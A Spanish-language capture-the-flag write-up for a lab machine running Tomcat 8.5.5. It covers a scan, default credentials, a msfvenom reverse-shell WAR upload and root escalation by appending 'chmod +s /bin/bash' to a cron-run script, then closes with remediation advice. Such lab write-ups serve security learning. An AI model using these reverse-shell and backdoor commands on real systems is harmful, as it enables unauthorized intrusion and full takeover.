# Thompson
## Initial Scan
```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
```
## Enum
Las cred por defecto tomcat:s3cret estan habilitadas en el servicio Apache Tomcat, esto nos permite acceder a la administración de tomcat
## Exploit
Dado que tenemos acceso de administración al servicio podemos subir archivos en formato war y desplegarlos, lo generamos con el siguiente comando
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=1234 -f war > shell.war
```
Y lo subimos al server, con esto ya tendriamos shell como tomcat, veamos como escalar
## Privesc
Dentro del crontab vemos el siguiente cronjob
```
*  *	* * *	root	cd /home/jack && bash id.sh
```
Veamos si podemos modificar dicho archivo y escalar privilegios mediante este script
```
echo 'chmod +s /bin/bash' >> id.sh
```
Y cuando se ejecute tendremos nuestra backdoor

# Analisís de la intrusión
### Default creds
Mantener las credenciales por defecto en un servicio siempre es una via de entrada que no deberiamos dejar abierta nunca, en este caso fue lo que nos permitio entrar en el servidor
### Unrestricted file uploa
La permisión de subir archivos war sin control desde el menu de Tomcat nos permitio subir una reverse shell permitiendonos full RCE como Tomcat 
### Unsafe cronjob
Ejecutar un archivque no pertenece a root como root sin ningún control es un problema , en este caso abusamos del archivo de id.sh para elevar privilegios

# Solución
### Unrestricted file upload
Cambiando estos settings a false se elimiaria el problema:
```xml
            unpackWARs="true" autoDeploy="true">
```

### Unsafe cronjob
Para poder usar este tipo de cronjobs la mejor opción es que el script este owneado por el root en una carpeta de el root de modo que evitemos este tipo de ataques por manipulación del archivo
